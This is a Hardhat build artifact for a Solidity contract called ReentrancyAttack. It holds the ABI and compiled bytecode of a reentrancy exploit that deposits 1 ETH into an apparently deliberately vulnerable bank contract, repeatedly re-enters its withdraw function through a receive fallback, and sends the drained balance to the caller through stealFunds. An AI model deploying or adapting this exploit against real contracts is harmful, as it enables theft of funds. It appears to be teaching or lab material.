{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReentrancyAttack",
  "sourceName": "contracts/ReentrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract IVulnerableBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "stealFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161033338038061033383398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6102a0806100936000396000f3fe6080604052600436106100385760003560e01c806376cdb03b146100bb5780639e5faafc146100f7578063d5599f2e146100ff57600080fd5b366100b657600054670de0b6b3a76400006001600160a01b0390911631106100b4576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009b57600080fd5b505af11580156100af573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100c757600080fd5b506000546100db906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6100b4610114565b34801561010b57600080fd5b506100b461023b565b670de0b6b3a76400003410156101705760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b000000604482015260640160405180910390fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101c657600080fd5b505af11580156101da573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b15801561022157600080fd5b505af1158015610235573d6000803e3d6000fd5b50505050565b60405133904780156108fc02916000818181858888f19350505050158015610267573d6000803e3d6000fd5b5056fea2646970667358221220002b84fe3bda1ca967b3b63ad70158b4260b1e953bb6f0ba6d763ee6ad7a308264736f6c63430008130033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}